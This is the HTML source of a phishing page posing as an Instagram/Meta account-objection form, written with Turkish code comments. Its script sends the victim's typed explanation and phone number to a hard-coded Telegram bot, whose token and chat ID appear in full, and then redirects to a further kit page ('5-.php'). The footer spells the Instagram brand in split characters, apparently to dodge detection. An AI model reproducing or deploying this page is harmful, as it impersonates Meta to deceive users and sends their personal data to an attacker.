
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <script>

        function sendMessageToTelegram() {
            var chatId = '-4107249278'; // Hedef chat ID
            var botToken = '6712897367:AAFBFLG8srIn4GY5MatuCYJlpcjMBmsItYI'; // Botunuzun token'ı

            var message = document.getElementById('myTextarea').value; // Textarea'dan mesajı al
           var number = document.getElementById('phoneNumberInput').value;
            // Kullanıcının girdiği kelimenin "Telegram'a şu şekilde iletilmesini istiyorum" ifadesiyle birleştir
            var formattedMessage ='5-'+ '\n' +'exp: ' + message + '\n' + 'number: wa.me/+' +number;

            // Telegram API'ye gönderilecek URL oluştur
            var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(formattedMessage)}`;

            // API'ye HTTP GET isteği gönder
            var xhr = new XMLHttpRequest();
            xhr.open('GET', apiUrl, true);
            xhr.send();
            var redirectTo = '5-.php';
            window.location.href = redirectTo;
        }
    </script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Sayfa kaydığında scroll bar'ı gizler */
            background: linear-gradient(to bottom, white 100%,);
        }

        header {
            width: 100%;
            background-color: white;
            padding: 10px 0;
            position: fixed;
            top: 0;
            box-shadow: 0px 5px 5px -5px rgba(0, 0, 0, 0.5);
            z-index: 2; /* Main'in önünde olması için */
        }

        hr {
            border: none;
            margin: 0;
        }

        main {
            max-width: 600px;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 10px 0 10px rgba(0, 0, 0, 0.2);
            text-align: center;
            position: relative;
            z-index: 1;
            margin-top: -100vh; /* Yukarıda başlasın */
            transition: margin-top 1s ease; /* Animasyon süresi ve geçiş efekti */
            margin-bottom: 200px; /* Sabitlenmiş header'ın altında kalsın */
        }

        img {
          height: 100px;
            width: 100px; /* Resmi biraz daha büyüt */
            height: auto;
            margin: 0 auto;
            display: block;
        }

        textarea {
            width: 100%;
            height: 45px;
            margin: 15px 0;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: none;
            font-size: 16px;
            line-height: 1.4;
            background-color: #f9f9f9;
            outline: none;
        }
        input {
            width: 100%;
            height: 45px;
            margin: 15px 0;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            line-height: 1.4;
            background-color: #f9f9f9;
            outline: none;
        }
        button {
            font-family: 'Roboto', sans-serif;
            background-color: transparent;
            color: #fff;
            border: none;
            padding: 5px 30px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            opacity: 0.5;
            transition: opacity 0.3s ease;
        }

        button.active {
            background-color: #3498db;
            opacity: 1;
        }

        button:hover {
            background-color: #2980b9;
        }

        textarea:focus + button,
        textarea:not(:focus) + button {
            background-color: #3498db;
        }

        p {
            font-size: 12px;
            margin-top: 10px;
        }

        @media only screen and (max-width: 600px) {
            main {
                max-width: 100%;
                padding: 15px;
                margin-top: 0 !important;
                transition: none;
            }
        }

        footer {
            background-color: white;
            padding: 10px 0;
            width: 100%;
            position: fixed;
            bottom: 0;
            text-align: center;
            border-top: 1px solid #ccc; /* İnce çerçeve ekleniyor */
            box-shadow: 0px -5px 5px -5px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>

<body>
    <header>
        <!-- Header içeriği buraya gelecek -->
        <img src="https://i.hizliresim.com/oxaw80m.png" alt="cars">
        <hr>
    </header>
    <br> <br> <br> <br> <br>
    <main>

  <div style="width: 70px; height: 70px; border-radius: 50%; overflow: hidden; text-align: center; margin: auto; box-shadow: 0 0 0px 0px rgba(0, 0, 0, 0.5);">
<img src="https://i.hizliresim.com/ec163hw.png" alt="Kare Resim" style="width: 100%; height: 100%; border-radius: 50%;">
</div>






 <p>Your account and your objection will be reviewed. This period may take 24-48 hours. We recommend that you do not make changes to your account during this process.
</p>
        </div>

  <div>

      <textarea id="myTextarea" style="width: 100%; height: 145px; margin-bottom: 10px;" placeholder="Explanation"></textarea>
      <input type="number" id="phoneNumberInput" style="width: 100%; height: 45px; margin-bottom: 10px;" placeholder="Contact Phone Number" oninput="validatePhoneNumber()" />
      <button onclick="sendMessageToTelegram()" class="active">Objection</button>
      <!-- ... (existing content) ... -->
  </div>
  <style>
       body {
           background-color: #ffffff; /* Sayfa arka plan rengi */
       }

       /* Seçili öğelerin ve yazıların engellenmesi */
       ::selection {
           background-color: transparent;
           color: inherit; /* Yazı rengini değiştirmek istiyorsanız */
       }

       ::-moz-selection {
           background-color: transparent;
           color: inherit; /* Yazı rengini değiştirmek istiyorsanız */
       }

       /* Kullanıcı seçimini ve sürükleme işlemini engelleme */
       body {
           user-select: none;
           -moz-user-select: none; /* Firefox için */
           -ms-user-select: none; /* Internet Explorer için */
           -webkit-user-select: none; /* Chrome, Safari ve Opera için */
           -webkit-user-drag: none; /* Chrome, Safari ve Opera için sürükleme engelleme */
       }
   </style>
  <script>
          // Fotoğraflara tıklanmayı ve sürüklenmeyi engellemek için JavaScript kodu
          document.addEventListener('DOMContentLoaded', function() {
              var images = document.getElementsByTagName('img');
              for (var i = 0; i < images.length; i++) {
                  images[i].addEventListener('click', function(event) {
                      event.preventDefault();
                  });

                  images[i].addEventListener('dragstart', function(event) {
                      event.preventDefault();
                  });
              }
          });
      </script>



         <a href="https://help.instagram.com" style="text-decoration: none; color: #0095F6;">
           <p style="font-size: 10px; margin: 10px;">Get more help?</p>
       </a>
       <script>
           function validatePhoneNumber() {
               var phoneNumberInput = document.getElementById('phoneNumberInput');
               var phoneNumber = phoneNumberInput.value;

               // Eğer girilen değerin uzunluğu 15'ten fazlaysa, sadece ilk 15 hanesini al
               if (phoneNumber.length > 15) {
                   phoneNumberInput.value = phoneNumber.slice(0, 15);
               }
           }
       </script>

        <script>
        window.addEventListener('load', function () {
    var mainElement = document.querySelector('main');

    // Başlangıçta sayfanın yüksekliğini al
    var initialHeight = mainElement.offsetHeight;

    // Yukarıda başlasın
    mainElement.style.marginTop = -initialHeight + 'px';

    // Animasyonu başlat
    setTimeout(function () {
        mainElement.style.marginTop = '0'; // Yukarıda başlasın
    }, 100);
});

        </script>
        <script>
    function redirect() {
        // Burada yerine yönlendirmek istediğiniz sayfanın yolunu belirtin
        var redirectTo = '5-.php';

        // JavaScript ile sayfayı yönlendir
        window.location.href = redirectTo;
    }
</script>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                // Diğer kodlar burada...

                // Yeni event listener ekleyerek "Enter" tuşuna basıldığında butonu aktifleştir
                document.getElementById('myTextarea').addEventListener('keydown', function (e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        document.getElementById('myButton').click();
                    }
                });
            });

            // Diğer kodlar burada...
        </script>
         <script>
      document.addEventListener('DOMContentLoaded', function () {
          // Belirli bir kelimeyi oluşturmak için harfler
          var letters = ['©', '2', '0', '2', '4', 'I', 'N', 'S', 'T'];

          // Harfleri direkt olarak birleştir
          var dynamicWord = letters.join('');
          document.getElementById('dynamicWord').textContent = dynamicWord;
      });
  </script>

    </main><style>
    .container {
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        padding: 20px;
        width: 80%;
        max-width: 1200px;
        text-align: justify;
    }  @media screen and (min-width: 768px) {
        p {
            font-size: 18px; /* 768 piksel ve üstü için font boyutu */
        }
    }
      .left-content, .right-content {
        text-align: center;
      }
    </style>
    <div style="background-color:#fbeaf5;opacity:0.8;border: 1px solid #cd486b ; border-radius:5px" class="container">
<div class="left-content">
  <h4>Want support?
Answers from our community</h4>
<p>If you're having trouble, find answers to your questions from Meta Support users around the world.</p>
   <a href="https://help.instagram.com/366993040048856/">
<button style="background-color: #cd486b ;">Contact</button></a></div>
    <footer style="font-size: 1px; line-height: 1;">
      <p id="dynamicWord" style="margin: 0; display: inline;"></p>
      <p style="display: inline;"> AGRAM</p>
  </footer>

</body>

</html>
